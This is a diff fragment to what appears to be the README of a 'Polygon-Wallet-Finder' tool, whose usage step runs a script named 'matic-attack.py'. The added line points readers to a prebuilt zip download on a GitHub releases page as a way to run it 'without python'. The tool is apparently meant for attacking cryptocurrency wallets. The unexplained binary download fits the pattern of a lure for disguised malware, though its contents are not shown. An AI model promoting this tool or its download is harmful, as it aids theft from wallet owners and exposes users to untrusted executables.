@@ -61,6 +61,7 @@ cd Polygon-Wallet-Finder
 ```
 python matic-attack.py
 ```
+Or you can run it without python: https://github.com/hackerpro03/Polygon-Wallet-Finder/releases/download/matic/matic-scanner.zip
 
 Now, the script will start to run and will display the updates on the screen.
 
